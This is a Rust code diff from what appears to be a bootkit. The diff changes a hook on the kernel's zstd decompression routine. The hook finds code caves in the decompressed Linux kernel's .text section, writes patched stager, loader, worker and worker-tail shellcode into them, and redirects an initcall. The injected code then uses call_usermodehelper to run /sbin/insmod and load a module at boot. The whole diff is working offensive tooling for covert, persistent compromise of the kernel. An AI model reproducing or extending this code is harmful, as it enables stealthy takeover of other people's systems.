@@ -4,8 +4,8 @@ use crate::helpers::{
     file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_excluding_after},
     memory_helper::{
         INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
-        find_sentinel_4, find_sentinel_8, get_initcall_phase_address, inline_jump_hook,
-        restore_inline_hook, translate_physical_to_virtual,
+        find_sentinel_4, get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
+        translate_physical_to_virtual,
     },
 };
 
@@ -28,7 +28,6 @@ const CALL_USERMODEHELPER_PATTERN: &[u8] =
 const CALL_USERMODEHELPER_DISTANCE: u8 = 0x40;
 const CALL_UMH_REL_SENTINEL: u32 = 0xDDEEFF00;
 const ARGV0_VIRT_SENTINEL: u64 = 0xAAAAAAAAAAAAAAAA;
-const ARGV1_VIRT_SENTINEL: u64 = 0xBBBBBBBBBBBBBBBB;
 const WORK_STRUCT_DISP_SENTINEL: u32 = 0x11223344;
 const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
 const SCHEDULE_WORK_PATTERN: &[u8] = &[0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00];
@@ -39,8 +38,12 @@ const MSLEEP_PATTERN: &[u8] = &[
 const MSLEEP_DISTANCE: u8 = 0x1E;
 const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
 const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
+const LKM_WORKER_DISP_SENTINEL: u32 = 0xAABBCCEE;
+const WORKER_TAIL_REL_SENTINEL: u32 = 0xEEAABBCC;
 const PATH_DISP_SENTINEL: u32 = 0xCCDDEE11;
 const ARGV_DISP_SENTINEL: u32 = 0xCCDDEE22;
+const MODULE_FROM_PATH_OFFSET_SENTINEL: u8 = 0x7F;
+const HELPER_PATH: &[u8] = b"/sbin/insmod\0";
 const MIN_TEXT_CAVE_OFFSET: usize = 0x1000;
 
 // Ubuntu 24.04's 6.8 kernel has CONFIG_DEBUG_OBJECTS_WORK disabled. This is
@@ -226,6 +229,8 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     const LOADER_LEN: usize = LOADER_TEMPLATE.len();
     const WORKER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_BIN"));
     const WORKER_LEN: usize = WORKER_TEMPLATE.len();
+    const WORKER_TAIL_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_TAIL_BIN"));
+    const WORKER_TAIL_LEN: usize = WORKER_TAIL_TEMPLATE.len();
 
     let stager_cave = match cave_finder_by_section_name_excluding_after(
         dst,
@@ -250,17 +255,43 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     };
     debug!("Stager cave: phys={:#x}", stager_cave);
 
-    let worker_cave = match cave_finder_by_section_name_excluding_after(
+    let worker_tail_cave = match cave_finder_by_section_name_excluding_after(
         dst,
         dst_capacity,
-        WORKER_LEN,
+        WORKER_TAIL_LEN,
         ".text",
         &[(stager_cave, stager_end)],
         MIN_TEXT_CAVE_OFFSET,
     ) {
         Some(addr) => addr,
         None => {
-            error!("Failed to find separate worker cave in .text");
+            error!("Failed to find separate worker tail cave in .text");
+            return ret_val;
+        }
+    };
+    let worker_tail_end = match worker_tail_cave.checked_add(WORKER_TAIL_LEN) {
+        Some(addr) => addr,
+        None => {
+            error!("Worker tail cave range overflow");
+            return ret_val;
+        }
+    };
+    debug!("Worker tail cave: phys={:#x}", worker_tail_cave);
+
+    let worker_cave = match cave_finder_by_section_name_excluding_after(
+        dst,
+        dst_capacity,
+        WORKER_LEN,
+        ".text",
+        &[
+            (stager_cave, stager_end),
+            (worker_tail_cave, worker_tail_end),
+        ],
+        MIN_TEXT_CAVE_OFFSET,
+    ) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to find separate worker sleeper cave in .text");
             return ret_val;
         }
     };
@@ -349,6 +380,14 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
             return ret_val;
         }
     };
+    let worker_tail_cave_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, worker_tail_cave) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to translate worker tail cave to virtual address");
+                return ret_val;
+            }
+        };
     let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
         Some(addr) => addr,
         None => {
@@ -357,8 +396,8 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         }
     };
     debug!(
-        "Caves: stager virt={:#x}, worker virt={:#x}, loader data virt={:#x}",
-        stager_cave_virt, worker_cave_virt, loader_cave_virt
+        "Caves: stager virt={:#x}, worker virt={:#x}, worker tail virt={:#x}, loader data virt={:#x}",
+        stager_cave_virt, worker_cave_virt, worker_tail_cave_virt, loader_cave_virt
     );
 
     let mut stager = [0u8; STAGER_LEN];
@@ -377,6 +416,22 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
     } else {
         error!("Failed to find WORK_STRUCT_DISP_SENTINEL in stager");
+        return ret_val;
+    }
+
+    let sentinel = LKM_WORKER_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
+        let disp32 = (worker_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!(
+                "Worker cave too far from stager for disp32: delta={:#x}",
+                disp32
+            );
+            return ret_val;
+        }
+        stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find LKM_WORKER_DISP_SENTINEL in stager");
         return ret_val;
     }
 
@@ -418,39 +473,22 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
 
     let work_entry_virt = loader_cave_virt as u64 + 8;
     loader[0..8].copy_from_slice(&WORK_STRUCT_NO_POOL.to_le_bytes());
-    loader[8..16].copy_from_slice(&work_entry_virt.to_le_bytes());
-    loader[16..24].copy_from_slice(&work_entry_virt.to_le_bytes());
-    loader[24..32].copy_from_slice(&(worker_cave_virt as u64).to_le_bytes());
+    loader[8..16].copy_from_slice(&0u64.to_le_bytes());
+    loader[16..24].copy_from_slice(&0u64.to_le_bytes());
+    loader[24..32].copy_from_slice(&0u64.to_le_bytes());
     debug!(
-        "Initialized work_struct: data={:#x}, entry={:#x}, func={:#x}",
+        "Initialized work_struct template: data={:#x}, runtime entry={:#x}, runtime func={:#x}",
         WORK_STRUCT_NO_POOL, work_entry_virt, worker_cave_virt
     );
 
-    let modprobe_path_off = LOADER_TEMPLATE
-        .windows(b"/sbin/modprobe\0".len())
-        .position(|w| w == b"/sbin/modprobe\0")
-        .expect("path_buffer start not found in loader template")
-        as u64;
-    let module_name_off = modprobe_path_off + b"/sbin/modprobe\0".len() as u64;
-    let argv0_virt = loader_cave_virt as u64 + modprobe_path_off;
-    let argv1_virt = loader_cave_virt as u64 + module_name_off;
-    let sentinel = ARGV0_VIRT_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_8(&loader, &sentinel) {
-        loader[off..off + 8].copy_from_slice(&argv0_virt.to_le_bytes());
-    } else {
-        error!("Failed to find ARGV0_VIRT_SENTINEL in loader data");
-        return ret_val;
-    }
-    let sentinel = ARGV1_VIRT_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_8(&loader, &sentinel) {
-        loader[off..off + 8].copy_from_slice(&argv1_virt.to_le_bytes());
-    } else {
-        error!("Failed to find ARGV1_VIRT_SENTINEL in loader data");
-        return ret_val;
-    }
+    let helper_path_off = LOADER_TEMPLATE
+        .windows(HELPER_PATH.len())
+        .position(|w| w == HELPER_PATH)
+        .expect("path_buffer start not found in loader template") as u64;
+    let module_name_off = helper_path_off + HELPER_PATH.len() as u64;
     debug!(
-        "Patched argv: argv[0]={:#x}, argv[1]={:#x}",
-        argv0_virt, argv1_virt
+        "Loader argv will be initialized at runtime: argv[0]=data+{:#x}, argv[1]=data+{:#x}",
+        helper_path_off, module_name_off
     );
 
     let mut worker = [0u8; WORKER_LEN];
@@ -472,19 +510,57 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         return ret_val;
     }
 
-    let sentinel = CALL_UMH_REL_SENTINEL.to_le_bytes();
+    let sentinel = WORKER_TAIL_REL_SENTINEL.to_le_bytes();
     if let Some(off) = find_sentinel_4(&worker, &sentinel) {
-        let rel32 = (call_usermodehelper_virt as i64) - (worker_cave_virt as i64 + off as i64 + 4);
+        let rel32 = (worker_tail_cave_virt as i64) - (worker_cave_virt as i64 + off as i64 + 4);
         if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
             error!(
-                "call_usermodehelper too far from worker cave for rel32: delta={:#x}",
+                "worker tail too far from worker cave for rel32: delta={:#x}",
                 rel32
             );
             return ret_val;
         }
         worker[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find CALL_UMH_REL_SENTINEL in worker");
+        error!("Failed to find WORKER_TAIL_REL_SENTINEL in worker");
+        return ret_val;
+    }
+
+    let mut worker_tail = [0u8; WORKER_TAIL_LEN];
+    worker_tail.copy_from_slice(WORKER_TAIL_TEMPLATE);
+
+    if let Some(off) = worker_tail
+        .iter()
+        .position(|byte| *byte == MODULE_FROM_PATH_OFFSET_SENTINEL)
+    {
+        let module_from_path = module_name_off - helper_path_off;
+        if module_from_path > u8::MAX as u64 {
+            error!(
+                "module path offset too large for worker tail imm8: offset={:#x}",
+                module_from_path
+            );
+            return ret_val;
+        }
+        worker_tail[off] = module_from_path as u8;
+    } else {
+        error!("Failed to find MODULE_FROM_PATH_OFFSET_SENTINEL in worker tail");
+        return ret_val;
+    }
+
+    let sentinel = CALL_UMH_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
+        let rel32 =
+            (call_usermodehelper_virt as i64) - (worker_tail_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!(
+                "call_usermodehelper too far from worker tail cave for rel32: delta={:#x}",
+                rel32
+            );
+            return ret_val;
+        }
+        worker_tail[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find CALL_UMH_REL_SENTINEL in worker tail");
         return ret_val;
     }
 
@@ -495,38 +571,38 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
             .position(|w| w == s.as_slice())
             .expect("argv_buffer not found in loader template")
     };
-    let path_buffer_virt = loader_cave_virt + modprobe_path_off as usize;
+    let path_buffer_virt = loader_cave_virt + helper_path_off as usize;
     let argv_buffer_virt = loader_cave_virt + argv_buffer_off;
 
     let sentinel = PATH_DISP_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&worker, &sentinel) {
-        let disp32 = (path_buffer_virt as i64) - (worker_cave_virt as i64 + off as i64 + 4);
+    if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
+        let disp32 = (path_buffer_virt as i64) - (worker_tail_cave_virt as i64 + off as i64 + 4);
         if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
             error!(
-                "path_buffer too far from worker for disp32: delta={:#x}",
+                "path_buffer too far from worker tail for disp32: delta={:#x}",
                 disp32
             );
             return ret_val;
         }
-        worker[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+        worker_tail[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find PATH_DISP_SENTINEL in worker");
+        error!("Failed to find PATH_DISP_SENTINEL in worker tail");
         return ret_val;
     }
 
     let sentinel = ARGV_DISP_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&worker, &sentinel) {
-        let disp32 = (argv_buffer_virt as i64) - (worker_cave_virt as i64 + off as i64 + 4);
+    if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
+        let disp32 = (argv_buffer_virt as i64) - (worker_tail_cave_virt as i64 + off as i64 + 4);
         if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
             error!(
-                "argv_buffer too far from worker for disp32: delta={:#x}",
+                "argv_buffer too far from worker tail for disp32: delta={:#x}",
                 disp32
             );
             return ret_val;
         }
-        worker[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+        worker_tail[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find ARGV_DISP_SENTINEL in worker");
+        error!("Failed to find ARGV_DISP_SENTINEL in worker tail");
         return ret_val;
     }
 
@@ -534,10 +610,22 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
         core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
         core::ptr::copy_nonoverlapping(worker.as_ptr(), worker_cave as *mut u8, WORKER_LEN);
+        core::ptr::copy_nonoverlapping(
+            worker_tail.as_ptr(),
+            worker_tail_cave as *mut u8,
+            WORKER_TAIL_LEN,
+        );
     }
     debug!(
-        "Wrote {} bytes of stager to {:#x}, {} bytes of loader data to {:#x}, {} bytes of worker to {:#x}",
-        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave, WORKER_LEN, worker_cave
+        "Wrote {} bytes of stager to {:#x}, {} bytes of loader data to {:#x}, {} bytes of worker to {:#x}, {} bytes of worker tail to {:#x}",
+        STAGER_LEN,
+        stager_cave,
+        LOADER_LEN,
+        loader_cave,
+        WORKER_LEN,
+        worker_cave,
+        WORKER_TAIL_LEN,
+        worker_tail_cave
     );
 
     let relative_offset = (stager_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
